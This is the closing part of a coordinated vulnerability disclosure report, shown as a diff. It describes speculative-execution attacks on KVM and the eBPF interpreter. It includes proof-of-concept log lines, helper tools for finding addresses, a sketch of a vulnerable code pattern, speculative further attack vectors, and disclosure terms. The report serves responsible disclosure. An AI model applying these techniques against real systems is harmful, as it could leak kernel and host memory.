+[14:23:40] 0xffffffffa8e9ef84: 0x50
+[14:23:44] 0xffffffffa8e9ef85: 0x00
+[14:23:44] 0xffffffffa8e9ef60: "|/usr/share/apport/apport %p %s %c %P"
+
+The other files in writeup_files/kvm_4.11_preliminary_stuff are some
+tools I wrote to be able to determine the addresses necessary to run
+the PoC:
+
+ - a QEMU patch for determining the guest-physical -> host-user-virtual
+   mapping
+ - a kernel module for dumping the PAGE_OFFSET of the host kernel
+ - a helper for dumping virtual -> physical mappings from
+   /proc/$pid/pagemap on the host machine
+
+
+== IDEAS ABOUT OTHER ATTACK VECTORS / TARGETS ==
+This section contains ***entirely untested speculation*** about other
+possible attack vectors or targets. You're probably in a better
+position than I am to judge how likely these are to work.
+
+=== SPECULATIVE RIP CONTROL VIA OOB FUNCTION POINTER ARRAY INDEX ===
+A different, potentially more powerful vulnerable code pattern than
+the one presented in the introduction might be:
+
+    struct foo {
+      ...
+      void (*func)(...);
+      ...
+    };
+    struct foo_array {
+      unsigned long length;
+      struct foo data[];
+    };
+    struct foo_array *arr = ...;
+    unsigned long user_input = ...;
+    if (user_input < arr->length) {
+      arr->data[user_input](...);
+    }
+
+Perhaps an out-of-bounds array access in such code could cause
+execution at an address loaded from untrusted memory, leading to
+speculative RIP control. This could potentially, depending on how
+much the attacker knows about the memory layout and whether the
+attacker can create code that is executable in the targeted context,
+be used to leak both register contents and data from arbitrary virtual
+addresses.
+
+=== NATURALLY OCCURING VULNERABLE CODE ===
+While in this exploit, I targeted a bytecode interpreter, it seems
+somewhat plausible that one of the vulnerable code patterns might
+appear in existing code. I suspect that the most constraining
+requirement of the attack is that the array length must not be in the
+same cacheline as a pointer to the array data, but must be stored in
+memory.
+
+=== SPECULATIVE SYSCALL BOUNDARY CROSSING ===
+I have found nothing in the Intel manuals or the optimization guide
+that declares SYSRET to be a serializing instruction. Therefore, for
+attacks against kernels, it seems possible that an attacker might be
+able to make the CPU speculate past a bounds check in the kernel,
+speculatively read an out-of-bounds value and speculatively return the
+out-of-bounds value to userspace, which could then compute an array
+offset from the value and speculatively access a userspace array.
+However, kernels tend to perform a lot of operations on syscall exit
+(like checking for pending work, restoring all registers and so on),
+which probably mitigates quite a bit even if this is possible.
+
+=== TARGETS ===
+In this exploit, I targeted the eBPF interpreter because starting from
+native code execution provides more control than running from an
+interpreted context and eBPF is the only in-kernel bytecode
+interpreter I know of.
+It seems likely that browsers are also exploitable because they have
+JITs that can store data structures in various representations, but I
+haven't looked at that in detail yet because doing timing and caching
+stuff from JavaScript seems pretty fiddly.
+
+
+== MISCELLANEOUS ==
+[... TODO ...]
+
+Because we know of no interface that would permit debugging
+speculative execution, the explanations about underlying behavior in
+this report are derived from public documentation, public research and
+observed effects and might not accurately reflect what is actually
+going wrong in the CPUs.
+
+We have not reported this bug to the Linux kernel or other potentially
+affected software projects because we believe that processor vendors
+are in the best position to develop a fix with a relatively low
+performance impact, to assess whether a fix is reliable and to
+determine the parties that need to cooperate to roll out a fix.
+Please notify other parties (like operating system vendors, browser
+vendors and cloud providers) as you see fit.
+Please note that so far, we have not notified other parts of Google
+about this issue.
+
+When you notify other parties about this issue, please don't share
+information unnecessarily; this report includes information about all
+vendors and architectures we looked into to allow you to judge
+yourself whether you might be affected.
+
+Please let me know whether you can reproduce the behavior we have
+reported and whether you're going to treat this behavior as a
+processor security bug.
+
+To ARM: We are treating you as the upstream vendor for all processors
+based on the ARM architecture, including those manufactured by Apple
+and Qualcomm. Please notify them as necessary.
+
+Please confirm that you have received this bug report.
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available, the bug report will become
+visible to the public.
